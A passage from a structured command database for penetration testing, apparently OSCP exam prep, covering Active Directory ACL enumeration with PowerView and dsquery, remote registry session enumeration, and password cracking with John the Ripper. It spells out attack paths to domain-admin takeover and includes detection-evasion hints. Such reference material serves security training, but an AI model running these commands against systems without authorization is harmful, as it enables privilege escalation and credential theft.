- Custom services:
Application accounts

KERBEROASTING:
User accounts with SPNs = offline crackable tickets.

Time:
10-30 seconds","high","","","","{""RPC server unavailable"": ""DC unreachable. Check connectivity: ping <DC>""}","{""-T"": ""Specifies the target domain to query"", ""-Q"": ""Queries for SPNs. */* wildcard matches all service types and hosts""}","","[""get-netuser""]",""
"dsquery-users","Query All Domain Users (dsquery)","enumeration","dsquery user","LDAP query for all user objects in the domain using dsquery","","","Returns distinguished names (DNs), not usernames.

Pipe to dsget for readable output:
dsquery user | dsget user -samid -desc","medium","","","","{""dsquery is not recognized"": ""Tool requires RSAT (Remote Server Administration Tools) or run from DC""}","","","[""get-netuser""]",""
"dsquery-computers","Query All Domain Computers (dsquery)","enumeration","dsquery computer","LDAP query for all computer objects in the domain","","","Returns DNs.

Convert to hostnames:
dsquery computer | dsget computer -name","medium","","","","","","","[""get-netcomputer""]",""
"dsquery-admins","Query Domain Admins Group (dsquery)","enumeration","dsquery group -name ""Domain Admins"" | dsget group -members","Query Domain Admins group and list all members","","","TWO-STAGE QUERY:
1.

dsquery finds group DN

2.

dsget extracts members

COMMAND:
  dsquery group -name ""Domain Admins"" | dsget group -members

REQUIRES:
RSAT tools installed.

ALTERNATIVE:
  net group ""Domain Admins"" /domain
(Simpler, more reliable)

Time:
5-10 seconds","high","","","","","{""-name"": ""Filter groups by name"", ""-members"": ""List all members of the group""}","[""evil-winrm-shell""]","[""powerview-get-netuser-all"", ""ldapsearch-users-ad""]","[""impacket-getuserspns-kerberoast"", ""powerview-find-localadminaccess""]"
"dsquery-domain-controllers","Query Domain Controllers (dsquery)","enumeration","dsquery server","Query all domain controllers in the forest","","","QUERY ALL DOMAIN CONTROLLERS:
COMMAND:
  dsquery server

OUTPUT:
DC distinguished names with site information.

REQUIRES:
RSAT tools installed.

ALTERNATIVE:
  nltest /dclist:<DOMAIN>
(More reliable, built-in)

Time:
<5 seconds","high","","","","","","","[""net-domain-controllers""]",""
"powerview-get-objectacl","Get Object ACL (PowerView)","enumeration","Get-ObjectAcl -Identity <OBJECT>","Retrieve Access Control List (permissions) for any AD object to identify who has what access","","Get-ObjectAcl -Identity administrator","Returns ACL (Access Control List) - all permissions applied to an object.

EACH ACE (ACCESS CONTROL ENTRY) DEFINES:
1.

SecurityIdentifier:
Who has access (as SID)
2.

ActiveDirectoryRights:
What access they have (GenericAll, WriteDACL, etc.)

OUTPUT ANALYSIS:
Output is verbose - use Convert-SidToName to resolve SIDs.
Filter for dangerous rights.

OSCP PRIVESC:
Look for GenericAll, WriteDACL, WriteOwner on privileged groups/users.","high","","","","{""Module not imported"": ""Import-Module .\\PowerView.ps1"", ""Too much output"": ""Filter specific fields: Get-ObjectAcl -Identity <OBJECT> | select SecurityIdentifier,ActiveDirectoryRights""}","{""-Identity"": ""Specifies the AD object to query ACLs for. Accepts username, group name, computer name, or distinguished name."", ""-ResolveGUIDs (optional)"": ""Resolves GUIDs in ObjectAceType to human-readable names. Use: Get-ObjectAcl -Identity <OBJECT> -ResolveGUIDs""}","[""import-powerview""]","[""get-acl""]","[""powerview-convert-sidtoname""]"
"powerview-get-objectacl-genericall","Find GenericAll Permissions (PowerView)","enumeration","Get-ObjectAcl -Identity ""<OBJECT>"" | ? {$_.ActiveDirectoryRights -eq ""GenericAll""} | select SecurityIdentifier,ActiveDirectoryRights","Enumerate who has GenericAll (full control) permissions on a specific AD object","","Get-ObjectAcl -Identity ""Domain Admins"" | ? {$_.ActiveDirectoryRights -eq ""GenericAll""} | select SecurityIdentifier,ActiveDirectoryRights","GENERICALL = FULL CONTROL

ON USER OBJECTS:
- Reset their password
- Modify attributes
- Read all properties

ON GROUP OBJECTS:
- Add/remove members (add yourself to Domain Admins!)
- Modify group attributes

ON COMPUTER OBJECTS:
- Modify servicePrincipalName (Kerberoasting)
- Access LAPS password

OSCP:
Most powerful ACL for privilege escalation.
If you have GenericAll on privileged group  add yourself to group.","high","","","","{""No results"": ""No GenericAll permissions found. Try other dangerous rights: WriteDACL, WriteOwner, ForceChangePassword""}","{""? {$_.ActiveDirectoryRights -eq \""GenericAll\""}"": ""PowerShell Where-Object filter. Only shows ACEs where the permission is GenericAll (full control)."", ""select SecurityIdentifier,ActiveDirectoryRights"": ""Shows only SID (who has access) and rights (GenericAll).""}","[""import-powerview"", ""powerview-get-objectacl""]","","[""powerview-convert-sidtoname""]"
"powerview-convert-sidtoname","Convert SID to Username (PowerView)","enumeration","Convert-SidToName <SID>","Resolve Security Identifier (SID) to human-readable username, group name, or computer name","","Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104","SIDs (SECURITY IDENTIFIERS):
Unique identifiers for AD objects.

FORMAT:
S-1-5-21-<domain>-<RID>

COMMON RIDS:
- 500:
Administrator
- 512:
Domain Admins
- 513:
Domain Users

Get-ObjectAcl returns SIDs in SecurityIdentifier field.
Must convert to names for analysis.

BATCH CONVERSION:
  Get-ObjectAcl | select -ExpandProperty SecurityIdentifier | Convert-SidToName

ALTERNATIVE:
  [system.security.principal.securityidentifier]::new('<sid>').translate([system.security.principal.ntaccount]).value

OSCP:
SIDs are useless until converted to names.","high","","","","{""Module not imported"": ""Import-Module .\\PowerView.ps1"", ""SID not found"": ""SID may be from external domain, deleted object, or invalid format""}","","[""import-powerview""]","",""
"powerview-get-objectacl-writedacl","Find WriteDACL Permissions (PowerView)","enumeration","Get-ObjectAcl -Identity ""<OBJECT>"" | ? {$_.ActiveDirectoryRights -match ""WriteDacl""} | select SecurityIdentifier,ActiveDirectoryRights","Enumerate who can modify ACLs (permissions) on an AD object - allows granting yourself GenericAll","","Get-ObjectAcl -Identity ""Domain Admins"" | ? {$_.ActiveDirectoryRights -match ""WriteDacl""} | select SecurityIdentifier,ActiveDirectoryRights","WRITEDACL = MODIFY ACL PERMISSIONS

ATTACK PATH:
1.

You have WriteDACL on target object
2.

Grant yourself GenericAll on that object
3.

Now you have full control

EXAMPLE:
WriteDACL on 'Domain Admins'  Grant GenericAll  Add yourself to Domain Admins

SIMILAR POWERFUL RIGHTS:
- WriteOwner:
Change owner, then modify ACL
- WriteProperty:
Modify attributes

OSCP:
WriteDACL is as powerful as GenericAll - just requires one extra step.","high","","","","{""No results"": ""Try WriteOwner instead - allows changing object owner to yourself, then modifying permissions""}","{""-match \""WriteDacl\"""": ""Regex match for WriteDacl permission. Also matches WriteDACL (case-insensitive).""}","[""import-powerview"", ""powerview-get-objectacl""]","",""
"powerview-get-objectacl-forcechangepassword","Find ForceChangePassword Rights (PowerView)","enumeration","Get-ObjectAcl -Identity ""<USERNAME>"" -ResolveGUIDs | ? {$_.ObjectAceType -eq ""User-Force-Change-Password""} | select SecurityIdentifier,ObjectAceType","Enumerate who can reset passwords for a specific user without knowing the current password","","Get-ObjectAcl -Identity ""administrator"" -ResolveGUIDs | ? {$_.ObjectAceType -eq ""User-Force-Change-Password""} | select SecurityIdentifier,ObjectAceType","USER-FORCE-CHANGE-PASSWORD:
Can reset user's password without knowing current password.

ATTACK PATH:
1.

You have ForceChangePassword on target user
2.

Reset their password
3.

Authenticate as them

NO CURRENT PASSWORD NEEDED.
NO ACCOUNT LOCKOUT.

SIMILAR RIGHTS:
AllExtendedRights (includes password reset + other extended rights)

PROTECTED ACCOUNTS:
admincount=1 may have this right restricted by AdminSDHolder.

OSCP:
If you can reset Domain Admin password  domain compromised.","high","","","","{""No results"": ""User may be protected by AdminSDHolder. Check admincount attribute: Get-NetUser -Identity <USERNAME> | select admincount""}","{""-ResolveGUIDs"": ""Converts GUIDs in ObjectAceType to human-readable names like 'User-Force-Change-Password'."", ""ObjectAceType -eq \""User-Force-Change-Password\"""": ""Filters for the specific extended right that allows password resets.""}","[""import-powerview"", ""powerview-get-objectacl""]","",""
"powerview-get-objectacl-writeowner","Find WriteOwner Permissions (PowerView)","enumeration","Get-ObjectAcl -Identity ""<OBJECT>"" | ? {$_.ActiveDirectoryRights -match ""WriteOwner""} | select SecurityIdentifier,ActiveDirectoryRights","Enumerate who can change ownership of an AD object - allows granting yourself full permissions","","Get-ObjectAcl -Identity ""Domain Admins"" | ? {$_.ActiveDirectoryRights -match ""WriteOwner""} | select SecurityIdentifier,ActiveDirectoryRights","WRITEOWNER = CHANGE OBJECT OWNER
Object owners have implicit rights to modify the object's ACL.

ATTACK PATH:
1.

You have WriteOwner on target object
2.

Change owner to yourself:
Set-DomainObjectOwner
3.

As owner, grant yourself GenericAll
4.

Abuse full control (add to group, reset password, etc.)

COMPARISON:
Similar to WriteDACL but requires two steps instead of one.

OSCP:
WriteOwner on privileged group = privilege escalation path.","high","","","","{""No results"": ""Try WriteDACL or GenericAll instead""}","{""-match \""WriteOwner\"""": ""Regex filter for WriteOwner permission.""}","[""import-powerview"", ""powerview-get-objectacl""]","",""
"powerview-find-interestingdomainacl","Find Interesting ACL Misconfigurations (PowerView)","enumeration","Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -match ""<USERNAME>""}","Automatically discover ACL misconfigurations where specified user has dangerous permissions on other objects","","Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -match ""stephanie""}","AUTOMATED ACL ENUMERATION:
Scans entire domain for dangerous permissions.

RETURNS INTERESTING RIGHTS:
- GenericAll
- WriteDACL
- WriteOwner
- ForceChangePassword

KEY FIELDS:
- IdentityReferenceName:
Who has the permission (filter for your user)
- ObjectDN:
What object they have permission on (look for privileged groups/users)

PERFORMANCE:
Slow in large domains - consider manual enumeration of specific high-value targets.

OSCP:
Run this early to identify all potential privilege escalation paths via ACL abuse.","high","","","","{""Module not imported"": ""Import-Module .\\PowerView.ps1"", ""Long execution time"": ""Command queries entire domain. For faster results, query specific objects with Get-ObjectAcl""}","{""-ResolveGUIDs"": ""Resolves GUIDs to human-readable permission names."", ""? {$_.IdentityReferenceName -match \""<USERNAME>\""}"": ""Filters results to only show permissions YOUR user has on other objects.""}","[""import-powerview""]","",""
"powerview-get-pathacl","Get Share Path ACL (PowerView)","enumeration","Get-PathAcl -Path ""\\<TARGET>\<SHARE>""","Enumerate file share permissions to identify accessible or misconfigured shares","","Get-PathAcl -Path ""\\DC1.corp.com\SYSVOL""","NTFS PERMISSIONS ON NETWORK SHARES

FILESYSTEMRIGHTS:
- FullControl:
read/write/delete
- Modify:
read/write
- ReadAndExecute:
read/execute

IDENTITYREFERENCE:
Shows who has access (users/groups).

COMMON MISCONFIGURATION:
Everyone or Authenticated Users with Modify/FullControl on sensitive shares.

SYSVOL SHARE:
Domain-wide readable.
May contain GPP passwords (cpassword attribute).

OSCP:
Check all discovered shares for misconfigurations and sensitive data.","medium","","","","{""Module not imported"": ""Import-Module .\\PowerView.ps1"", ""Access Denied"": ""No read permissions on share. Try other shares: Find-DomainShare -CheckShareAccess""}","","[""import-powerview""]","",""
"powerview-get-objectacl-user","Get User Object ACL (PowerView)","enumeration","Get-ObjectAcl -Identity ""<USERNAME>"" | select SecurityIdentifier,ActiveDirectoryRights","Enumerate who has permissions on a specific user account","","Get-ObjectAcl -Identity ""sqlservice"" | select SecurityIdentifier,ActiveDirectoryRights","IDENTIFIES WHO CAN MODIFY USER ACCOUNT

LOOK FOR:
- GenericAll:
Full control
- WriteDACL:
Can change permissions
- ForceChangePassword:
Can reset password","high","","","","{""Object not found"": ""Verify username: Get-NetUser -Identity <USERNAME>""}","{""-Identity"": ""Target object (user, group, computer) to check ACL on. Accepts username, DN, or SID.""}","[""import-powerview""]","",""
"powerview-get-objectacl-group","Get Group Object ACL (PowerView)","enumeration","Get-ObjectAcl -Identity ""<GROUPNAME>"" | select SecurityIdentifier,ActiveDirectoryRights","Enumerate who has permissions on a specific group (e.g., Domain Admins)","","Get-ObjectAcl -Identity ""Domain Admins"" | select SecurityIdentifier,ActiveDirectoryRights","CRITICAL FOR PRIVILEGE ESCALATION

GenericAll on Domain Admins = you can add yourself to the group.

COMMON MISCONFIGURATION:
Check this early in enumeration.","high","","","","","{""-Identity"": ""Target group to enumerate ACL. Use quotes for names with spaces.""}","[""import-powerview""]","",""
"powerview-get-netcomputer-os","Enumerate Computer Operating Systems (PowerView)","enumeration","Get-NetComputer -FullData | Select-Object dnshostname, operatingsystem, operatingsystemversion","Query Active Directory for all domain computers with OS version information to identify legacy systems vulnerable to session enumeration attacks","","","CRITICAL FOR SESSION ENUMERATION STRATEGY:
Identify systems vulnerable to NetSessionEnum attacks.

BUILD NUMBER HISTORY:
Windows 10:
- 1507 (10240):
Vulnerable
- 1511 (10586):
Vulnerable
- 1607 (14393):
Vulnerable
- 1703 (15063):
Vulnerable
- 1709 (16299):
RESTRICTED - only admins can query sessions

Windows Server:
- 2012 R2 (9600):
Vulnerable
- 2016 (14393):
Vulnerable
- 2019 (17763/1809):
RESTRICTED

TARGET BUILD NUMBERS:
- Workstations:
<16299 (pre-1709)
- Servers:
<17763 (pre-2019)

COMMAND:
  Get-NetComputer -FullData | Select-Object dnshostname, operatingsystem, operatingsystemversion

WHY THIS MATTERS:
Older systems = ANY domain user can enumerate sessions.
Modern systems = Only admins can enumerate.

OSCP STRATEGY:
Enumerate OS versions FIRST  save vulnerable targets  run Get-NetSession only on those.

Time:
10-30 seconds","high","","","","{""Module not imported"": ""Import-Module .\\PowerView.ps1"", ""operatingsystem field empty"": ""Stale computer objects (inactive). Filter by lastlogontimestamp to find active systems."", ""Too much output"": ""Use Where-Object to filter: | Where-Object {$_.operatingsystem -like '*Server*'} to show only servers""}","{""-FullData"": ""Returns all LDAP attributes for computer objects including operatingsystem and operatingsystemversion. Required to get detailed OS information."", ""Select-Object"": ""PowerShell cmdlet to filter displayed properties - shows only relevant columns (hostname, OS name, OS build version).""}","[""import-powerview""]","[""get-adcomputer"", ""crackmapexec-smb-spray""]",""
"powerview-get-netcomputer-os-filter","Filter Legacy Operating Systems (PowerView)","enumeration","Get-NetComputer -FullData | Where-Object {($_.operatingsystem -like '*Server 2012*') -or ($_.operatingsystem -like '*Server 2016*') -or (($_.operatingsystem -like '*Windows 10*') -and ([int]($_.operatingsystemversion -split '\.')[2] -lt 16299))}","Filter domain computers to show only legacy systems vulnerable to unauthenticated NetSessionEnum (pre-Windows 10 1709, pre-Server 2019)","","","PRE-FILTERED TARGET LIST:
Automatic filtering for vulnerable systems only.

COMMAND:
  Get-NetComputer -FullData | Where-Object {($_.operatingsystem -like '*Server 2012*') -or ($_.operatingsystem -like '*Server 2016*') -or (($_.operatingsystem -like '*Windows 10*') -and ([int]($_.operatingsystemversion -split '\\.')[2] -lt 16299))}

WHAT THIS FILTERS:
- Server 2012 / 2012 R2 (build 9600)
- Server 2016 (build 14393)
- Windows 10 pre-1709 (build <16299)

RESTRICTION SOURCE:
MS security update KB4103727 (May 2018) changed SrvsvcSessionInfo registry permissions.

OSCP TIME SAVINGS:
- Without filter:
30+ minutes (enumerate all systems)
- With filter:
2-3 minutes (vulnerable systems only)

WORKFLOW:
1.

Run filter  save targets

2.

Enumerate sessions ONLY on those systems

3.

Skip modern systems entirely

Time:
10-30 seconds for filtering","high","","","","{""Syntax error"": ""PowerShell version 2.0 doesn't support complex Where-Object. Use older syntax: | ? {...}"", ""Empty results"": ""Domain may only have modern systems. Try broader filter: | Where-Object {$_.operatingsystem -notlike '*2019*' -and $_.operatingsystem -notlike '*Windows 11*'}"", ""operatingsystemversion parsing fails"": ""Some objects have non-standard version format. Add error handling: try/catch block or -match regex""}","{""-like '*Server 2012*'"": ""Matches Windows Server 2012 and 2012 R2 (both vulnerable to session enumeration)"", ""-like '*Server 2016*'"": ""Matches Windows Server 2016 (vulnerable - build 14393)"", ""[int]($_.operatingsystemversion -split '\\\\.')[2] -lt 16299"": ""Parses build number from version string (e.g., 10.0.15063), converts to integer, checks if less than 16299 (Windows 10 1709 threshold)""}","[""import-powerview""]","",""
"check-netsessionenum-registry","Check NetSessionEnum Registry Permissions","enumeration","Get-Acl 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity' | Format-List","Inspect registry permissions on SrvsvcSessionInfo key to determine if NetSessionEnum API is restricted to administrators only (modern Windows) or allows authenticated users (legacy)","","","Manual verification of NetSessionEnum vulnerability.

The SrvsvcSessionInfo registry value (REG_BINARY) under DefaultSecurity key is a Security Descriptor (SDDL format) that defines who can call NetWkstaUserEnum and NetSessionEnum APIs.

Pre-Windows 10 1709 / Server 2019:
Authenticated Users (S-1-5-11) have READ access to this SD = any domain user can enumerate sessions.

Post-1709/2019:
Only Administrators (S-1-5-32-544) and SYSTEM (S-1-5-18) have access = session enumeration restricted.

This is the root cause of Get-NetSession failures.

OSCP:
You likely won't check this manually (requires local admin) - instead, use OS version enumeration to predict vulnerability.

This command is for understanding WHY the restriction exists, not for routine recon.","medium","","","","{""Access denied"": ""Need local admin on target system. Run from elevated PowerShell OR use PsExec: psexec.exe \\\\TARGET -s powershell"", ""Key not found"": ""Path typo. Verify with: Test-Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\DefaultSecurity'"", ""Can't interpret ACL"": ""Export to file for analysis: Get-Acl ... | Export-Clixml acl.xml""}","{""Get-Acl"": ""PowerShell cmdlet to retrieve Access Control List (permissions) for registry key"", ""HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\DefaultSecurity"": ""Registry path where NetSessionEnum API permissions are configured. SrvsvcSessionInfo value under this key controls who can query SMB sessions."", ""Format-List"": ""Display ACL in readable list format (vs table format)""}","","",""
"check-remote-registry-service","Check Remote Registry Service Status","enumeration","Get-Service -ComputerName <TARGET> -Name RemoteRegistry","Query Remote Registry service status on target system - required for PsLoggedOn and Get-NetLoggedon to enumerate logged-on users","","Get-Service -ComputerName WS01.corp.com -Name RemoteRegistry","REMOTE REGISTRY SERVICE:
Required for PsLoggedOn and Get-NetLoggedon to work.

HOW IT WORKS:
Allows remote access to registry hives (HKLM, HKCU, HKEY_USERS) via RPC.
Tools read HKEY_USERS:
each loaded SID = logged-on user.

SERVICE STARTUP TYPES:
- Disabled:
Must be changed to Manual/Automatic first
- Manual:
Default on servers (auto-starts on connection)
- Automatic:
Always running

DEFAULT CONFIGURATIONS:
- Windows 8+ workstations:
Disabled
- Server 2012+:
Manual (good for attackers)

KEY INSIGHT:
If you have local admin + service is Manual  it auto-starts on connection (no explicit start needed).

COMMAND:
  Get-Service -ComputerName <TARGET> -Name RemoteRegistry

OSCP STRATEGY:
Check service status BEFORE attempting enumeration.
Saves time vs blind attempts.

Time:
<5 seconds per target","high","","","","{""Access denied"": ""Need local admin on target OR specific WMI query permissions. Try alternatives: PsExec + local query"", ""RPC server unavailable"": ""Target firewall blocking. Check basic connectivity: Test-Connection <TARGET>"", ""Cannot find service"": ""Service name case-sensitive on some PowerShell versions. Try: Get-Service -ComputerName <TARGET> | Where-Object {$_.Name -eq 'RemoteRegistry'}""}","{""-ComputerName"": ""Target remote computer to query service status on. Uses WMI/CIM for remote query."", ""-Name RemoteRegistry"": ""Service name for Remote Registry (display name: 'Remote Registry', service name: 'RemoteRegistry').""}","[""nmap-service-scan"", ""crackmapexec-smb-framework""]","[""get-service""]","[""enable-remote-registry"", ""ad-sam-dump-reg-save""]"
"enable-remote-registry","Enable Remote Registry Service","enumeration","sc.exe \\<TARGET> config RemoteRegistry start= auto && sc.exe \\<TARGET> start RemoteRegistry","Remotely enable and start Remote Registry service to allow session enumeration via PsLoggedOn or Get-NetLoggedon (requires local admin access)","","sc.exe \\WORKSTATION05.corp.com config RemoteRegistry start= auto && sc.exe \\WORKSTATION05.corp.com start RemoteRegistry","ENABLE REMOTE REGISTRY REMOTELY:
Requires local admin access on target.

COMMAND:
  sc.exe \\<TARGET> config RemoteRegistry start= auto && sc.exe \\<TARGET> start RemoteRegistry

WHAT THIS DOES:
1.

Change startup type to Automatic (persistent)

2.

Start service immediately

WHY THIS WORKS:
Local admin  modify services via SCM  enable Remote Registry  use for enumeration.

SERVICE STATES:
- Disabled:
Must change to Manual/Auto first (this command)
- Manual:
Just start it (no config change needed)
- Automatic:
Already running (no action needed)

OPSEC NOTE:
Enabling services logged (Event ID 7040).
Prefer targets where service already Manual.

OSCP USE CASE:
You have admin but Remote Registry disabled  enable it  run PsLoggedOn/Get-NetLoggedon.

Time:
<10 seconds","high","","","","{""Access denied"": ""Verify local admin access: dir \\\\<TARGET>\\C$. If fails, you don't have admin rights."", ""RPC server unavailable"": ""Firewall blocking or SMB disabled. Test: Test-NetConnection <TARGET> -Port 445"", ""Service fails to start"": ""Check dependencies: sc.exe \\\\<TARGET> qc RemoteRegistry. Dependencies must be running first."", ""Syntax error"": ""PowerShell interprets 'sc' as Set-Content alias. Use sc.exe to force Windows binary.""}","{""sc.exe"": ""Service Control command-line utility (sc.exe vs sc alias in PowerShell - .exe forces Windows binary)"", ""\\\\\\\\<TARGET>"": ""UNC path prefix for remote service management"", ""config RemoteRegistry start= auto"": ""Change service startup type to Automatic (service starts at boot). Note: space after 'start=' is required."", ""start RemoteRegistry"": ""Immediately start the service (doesn't wait for reboot)""}","[""check-remote-registry-service"", ""crackmapexec-validate-admin""]","","[""ad-sam-dump-reg-save"", ""crackmapexec-sam-dump""]"
"query-hkey-users-remote","Query Remote HKEY_USERS Hive","enumeration","reg query \\<TARGET>\HKU","Manually enumerate logged-on users by querying HKEY_USERS hive on remote system via Remote Registry (each SID = logged-on user)","","reg query \\FILESERVER01\HKU","MANUAL SESSION ENUMERATION:
Alternative to PsLoggedOn/Get-NetLoggedon.

HOW IT WORKS:
When users log in (interactive, RDP, RunAs), their NTUSER.DAT registry hive loads into HKEY_USERS\<SID>.
Each SID = active session.

COMMAND:
  reg query \\<TARGET>\HKU

SYSTEM SIDS TO IGNORE:
- S-1-5-18:
SYSTEM (always present)
- S-1-5-19:
LOCAL SERVICE
- S-1-5-20:
NETWORK SERVICE
- S-1-5-21-...-500:
Built-in Administrator (may not be logged in)

DOMAIN USER SIDS:
Start with S-1-5-21- and end with RID >1000.

SID-TO-NAME CONVERSION:
WMIC:
  wmic useraccount where sid='<SID>' get name

PowerShell:
  (New-Object System.Security.Principal.SecurityIdentifier('<SID>')).Translate([System.Security.Principal.NTAccount]).Value

OSCP ADVANTAGE:
Manual reg.exe often bypasses detection when automated tools blocked.

Time:
<10 seconds per target","medium","","","","{""Access denied"": ""Remote Registry service not running OR insufficient permissions. Start service: sc.exe \\\\<TARGET> start RemoteRegistry"", ""Network path not found"": ""SMB disabled or firewall blocking. Verify: Test-NetConnection <TARGET> -Port 445"", ""Too many SIDs"": ""Filter for domain users only: reg query \\\\<TARGET>\\HKU | findstr S-1-5-21""}","{""reg query"": ""Windows registry query command-line utility"", ""\\\\\\\\<TARGET>\\\\HKU"": ""Remote registry path. HKU = HKEY_USERS hive (abbreviated form). Lists all loaded user profile registry hives.""}","[""check-remote-registry-service""]","[""psloggedon""]",""
"john-single-crack","John Single Crack Mode","enumeration","john --single <HASH_FILE>","Single crack mode using username-based variations","","john --single shadow.txt","OSCP TIP:
Always run single mode FIRST - it's fast (<1 minute) and surprisingly effective.

Common successes:
username123, Username1!, Username@2023.

Requires username:hash format.

Most effective on /etc/shadow dumps where GECOS fields provide hints (full names, departments).","medium","","","","","{""--single"": ""Single crack mode - Generates password candidates based on username and GECOS fields. Most effective when hash file contains usernames (user:hash format). JtR applies intelligent mutations to username (john \u2192 john1, john123, John, JOHN, nhoj, etc.). Very fast - try FIRST before wordlist attacks. Success rate ~5-15% for weak passwords.""}","","","[""john-wordlist-attack"", ""john-show-cracked""]"
"john-wordlist-attack","John Wordlist Attack","enumeration","john --wordlist=<WORDLIST> <HASH_FILE>","Dictionary attack using wordlist","","john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt","Standard dictionary attack.

Run after --single mode.

Use rockyou.txt for comprehensive coverage (14M passwords).

JtR auto-detects hash format in most cases.","high","","","","","{""--wordlist"": ""Wordlist mode - Straight dictionary attack without mutations. Each password from wordlist tested as-is. Faster than rules mode but less coverage. Use for initial quick scan with common password lists. Default wordlist (if no path): /usr/share/john/password.lst (3,559 passwords).""}","","[""hashcat-md5-crack"", ""hashcat-ntlm-crack""]","[""john-show-cracked"", ""john-rules-attack""]"
"john-rules-attack","John Rule-Based Attack","enumeration","john --wordlist=<WORDLIST> --rules=<RULESET> <HASH_FILE>","Apply mutation rules to wordlist","","john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules ssh.hash","OSCP TIP:
Rule-based attacks crack passwords not in wordlist.

Users modify base words to meet policies (Password  Password123!).

Custom rules in /etc/john/john.conf:
[List.Rules:sshRules] then rule functions.

Default rules often sufficient - try before custom.","high","","","","","{""--rules"": ""Rules mode - Apply mutation rules from /etc/john/john.conf. Rules modify wordlist passwords (append, prepend, capitalize, etc.). Built-in rules: Wordlist (default), Extra, Jumbo, KoreLogic, All. Custom rules: Add [List.Rules:RuleName] section to john.conf. Rules dramatically increase coverage (password \u2192 Password1!, password123, etc.).""}","[""john-test-rules""]","[""hashcat-rule-attack"", ""hashcat-best64-rules""]","[""john-show-cracked""]"
"john-format-specify","John Specify Hash Format","enumeration","john --format=<FORMAT> --wordlist=<WORDLIST> <HASH_FILE>","Explicitly specify hash format (when auto-detect fails)","","john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt","List all formats:
john --list=formats | grep -i <hash_type>.

Common formats:
raw-md5 (plain MD5), nt (NTLM), Raw-SHA256, bcrypt, md5crypt ($1$), sha512crypt ($6$).

Auto-detect usually works but explicit format avoids ambiguity.","medium","","","","","{""--format"": ""Hash format - Override auto-detection. Required when: 1) Auto-detect fails 2) Multiple hash types possible (MD2/MD4/MD5 look identical) 3) Custom format needed. List formats: john --list=formats. Common: raw-md5, raw-sha1, raw-sha256, nt (NTLM), bcrypt, descrypt, md5crypt, sha512crypt.""}","","",""
"john-show-cracked","Show Cracked Passwords","enumeration","john --show <HASH_FILE>","Display previously cracked passwords from john.pot","","john --show hashes.txt","OSCP REQUIREMENT:
Document all cracked passwords.

Always run --show after successful crack.

JtR saves to ~/.john/john.pot permanently.

Combine with --format if needed:
john --show --format=raw-md5 hashes.txt","high","","","","","{""--show"": ""Show cracked - Display passwords from ~/.john/john.pot (persistent storage). JtR automatically saves cracked hashes. Format: username:password or hash:password. Use for: 1) Viewing results 2) Extracting passwords for documentation 3) Checking crack status.""}","[""john-wordlist-attack""]","[""hashcat-show-cracked""]","[""crackmapexec-validate-admin"", ""evil-winrm-shell"", ""ssh-login-password""]"
"john-ssh-key-crack","Crack SSH Private Key Passphrase","enumeration","john --wordlist=<WORDLIST> --rules=<RULESET> <SSH_HASH>","Crack SSH private key passphrase (supports all ciphers)","","john --wordlist=custom_wordlist.txt --rules=sshRules ssh.hash","OSCP TIP:
JtR supports MORE SSH ciphers than Hashcat.

Use JtR for SSH keys (especially modern keys with aes-256-ctr).

Extract hash:
ssh2john id_rsa > ssh.hash.

Build custom wordlist from user information (notes.txt, common words, dates).

Apply rules based on password policy.","high","","","","","{""SSH format"": ""John automatically detects SSH format from ssh2john output. Supports ALL SSH ciphers including aes-256-ctr (which Hashcat does NOT support). No --format flag needed for ssh2john output.""}","[""ssh2john-extract""]","[""hashcat-ssh-key-crack""]","[""john-show-cracked"", ""ssh-connect-password""]"
"john-keepass-crack","Crack KeePass Database","enumeration","john --wordlist=<WORDLIST> --rules=<RULESET> <KEEPASS_HASH>","Crack KeePass master password","","john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules keepass.hash","Extract hash:
keepass2john Database.kdbx > keepass.hash.

Remove 'Database:' prefix.

KeePass uses slow KDF - focused wordlists essential.

User password patterns critical (reuse with policy modifications).","high","","","","","{""KeePass format"": ""John auto-detects KeePass format from keepass2john output. Supports KeePass 1.x and 2.x. CPU-based cracking often comparable to GPU for KeePass (slow algorithm by design).""}","[""keepass2john-extract""]","[""hashcat-keepass-crack""]","[""john-show-cracked"", ""ssh-login-password"", ""evil-winrm-shell""]"
"john-incremental-mode","John Incremental Mode (Brute-Force)","enumeration","john --incremental <HASH_FILE>","Brute-force attack with intelligent character frequency","","john --incremental hashes.txt","Last resort attack - extremely slow.

Use only when:
1) No wordlist success 2) Short password suspected 3) Fast hash (MD5, NTLM).

NOT viable for OSCP exam time constraints unless very short password (<6 chars).","low","","","","","{""--incremental"": ""Incremental mode - Brute-force with character frequency analysis. NOT pure brute-force - uses statistical model based on common passwords. Tries likely character combinations first (e \u2192 a \u2192 o vs rare combos). Modes: ASCII (all printable), Alnum (alphanumeric), Digits (numbers only), LowerNum, UpperNum. Specify: --incremental=Digits. Very slow - use as last resort.""}","[""john-wordlist-attack"", ""john-rules-attack""]","[""hashcat-increment"", ""hashcat-mask-attack""]","[""john-show-cracked""]"
"john-status","John Show Status","enumeration","john --status","Display status of running/paused cracking session","","","Monitor long attacks:
john --status.

During active session, press any key for instant status update (no need for separate command).

Critical for OSCP time management - check ETA regularly.","medium","","","","","{""--status"": ""Status display - Show progress of current/last session. Information: Time running, Progress %, Passwords tested, Guesses (cracked), Current word, ETA. Use to monitor long-running attacks. Press any key during run to see status without --status flag.""}","","",""
"john-restore-session","John Restore Session","enumeration","john --restore","Resume previously interrupted cracking session","","","JtR auto-saves to ~/.john/john.rec.

Resume with:
john --restore.

Useful for multi-hour attacks interrupted by network issues or intentional pause.

Session file cleared after successful completion.","medium","","","","","{""--restore"": ""Restore session - Resume from last checkpoint. JtR auto-saves progress to ~/.john/john.rec. Restore after: Ctrl+C, crash, reboot. Continues from exact position. All parameters restored automatically (no need to specify wordlist, rules, etc.).""}","","",""
"john-list-formats","List All Supported Formats","enumeration","john --list=formats | grep -i <SEARCH>","List all hash formats supported by John","","john --list=formats | grep -i ssh","Reference command - find correct format name.

Examples:
raw-md5, raw-sha256, nt (NTLM), bcrypt, SSH, KeePass.

Grep for hash type:
